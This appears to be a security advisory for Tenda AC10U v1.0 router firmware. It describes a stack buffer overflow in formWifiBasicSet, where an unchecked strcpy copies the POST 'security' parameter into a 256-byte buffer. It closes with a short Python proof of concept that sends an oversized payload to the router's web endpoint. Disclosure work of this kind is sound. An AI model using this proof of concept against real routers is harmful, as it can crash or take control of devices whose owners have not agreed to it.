## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware  V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 V15.03.06.48 firmware has a stack overflow vulnerability in the `formWifiBasicSet` function. The `security` variable receives the `security` parameter from a POST request and is later assigned to the `param` variable, which is fixed at 256 bytes. However, since the user can control the input of `security`, the statement `strcpy(param, security);` can cause a buffer overflow. The user-provided `security` can exceed the capacity of the `param` array, triggering this security vulnerability.

![image-20240309195441696](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195441696.png)

![image-20240309195419761](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195419761.png)

![image-20240309195402169](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195402169.png)

## PoC

```python
import requests
from pwn import *

url = 'http://192.168.84.101/goform/WifiBasicSet'
payload = b'a' * 500 + p32(0xdeadbeef)
data = {
    'security_5g':'1', 
    'hideSsid':'1', 
    'ssid':'1',
    'security':payload, 
    'wrlPwd':'1', 
    'hideSsid_5g':'1', 
    'ssid_5g':'1', 
    'wrlPwd_5g': '1'
}

requests.post(url, data=data)
```

![image-20240304213056127](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240304213056127.png)
